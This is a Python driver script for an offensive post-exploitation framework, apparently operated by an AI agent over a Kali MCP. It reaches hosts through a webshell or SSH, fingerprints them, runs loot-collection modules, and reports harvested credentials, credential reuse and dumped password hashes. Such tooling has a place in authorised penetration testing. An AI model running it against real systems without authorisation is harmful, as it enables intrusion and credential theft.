#!/usr/bin/env python3
"""Non-interactive driver for the reap framework (the console's run/correlate/report
flow, scripted so it works over the Kali MCP). Uses only reap's library components.

Usage: python reap_run.py <session_spec> [db_path]
  webshell:<url>                       - exec over a command webshell (POST, param 'cmd')
  webshell:<METHOD>:<PARAM>:<url>      - e.g. webshell:GET:cmd:http://t/sh.php
  ssh:user:pass@host[:port]
  ssh-key:user@host[:port]:/path/to/key
"""
import re
import sys

from rich.console import Console

from reap.store import LootStore
from reap.fingerprint import fingerprint
from reap.modules import select, all_modules
from reap.correlation import CorrelationEngine
from reap.reporter import Reporter
from reap.transport.webshell import WebShellSession
from reap.transport.ssh import SSHSession

con = Console()


def build_session(spec: str):
    if spec.startswith("webshell:"):
        rest = spec[len("webshell:"):]
        m = re.match(r"^(GET|POST):([^:]+):(.+)$", rest, re.IGNORECASE)
        if m:
            return WebShellSession(url=m.group(3), method=m.group(1).upper(),
                                   param=m.group(2))
        return WebShellSession(url=rest)
    if spec.startswith("ssh:"):
        creds, _, hostpart = spec[4:].partition("@")
        user, _, pw = creds.partition(":")
        host, _, port = hostpart.partition(":")
        return SSHSession(host, user, password=pw, port=int(port or 22))
    if spec.startswith("ssh-key:"):
        rest = spec[len("ssh-key:"):]
        userhost, _, keypath = rest.partition(":/")
        keypath = "/" + keypath
        user, _, hostpart = userhost.partition("@")
        host, _, port = hostpart.partition(":")
        return SSHSession(host, user, key=keypath, port=int(port or 22))
    raise SystemExit(f"unknown session spec: {spec}")


def main():
    if len(sys.argv) < 2:
        raise SystemExit(__doc__)
    spec = sys.argv[1]
    db = sys.argv[2] if len(sys.argv) > 2 else "reap.db"
    store = LootStore(db)
    sess = build_session(spec)

    con.print(f"[cyan]== fingerprint {sess.session_id} ==[/]")
    ctx = fingerprint(sess)
    con.print(f"  os={ctx.os} priv={ctx.privilege} runtime={ctx.runtime or '-'} "
              f"container={ctx.is_container} minimal={ctx.minimal_userland} domain={ctx.domain_joined}")
    hid = store.get_or_create_host(sess.host, os=ctx.os)

    mods = select(ctx)
    con.print(f"[cyan]== run {len(mods)}/{len(all_modules())} matched modules ==[/]")
    total = 0
    for m in mods:
        try:
            findings = m.collect(sess)
        except Exception as exc:
            con.print(f"  [red]{m.name}: {exc}[/]")
            continue
        for f in findings:
            store.ingest(f, hid)
        total += len(findings)
        con.print(f"  [{'green' if findings else 'dim'}]{m.name}: {len(findings)}[/]")
    con.print(f"[green]collected {total} findings[/]")

    con.print("[cyan]== correlate ==[/]")
    for r in CorrelationEngine(store).run():
        if r.get("type") == "reuse":
            con.print(f"  [bold red]REUSE[/] {r['source']} -> {r['user']}@{r['host']}:{r['port']} ({r['proto']})")
        elif r.get("type") == "capability":
            con.print(f"  [bold magenta]CAPABILITY[/] {r['capability']}: {r['action']}")
        elif r.get("type") == "db_dump":
            con.print(f"  [bold yellow]DUMPED[/] {r['count']} hashes from "
                      f"{r['proto']}@{r['host']} (as {r['user']})")

    rep = Reporter(store)
    rep.render_creds(con)
    rep.render_findings(con)
    path = rep.export_markdown("reap-report.md")
    con.print(f"[green]report -> {path}[/]")


if __name__ == "__main__":
    main()

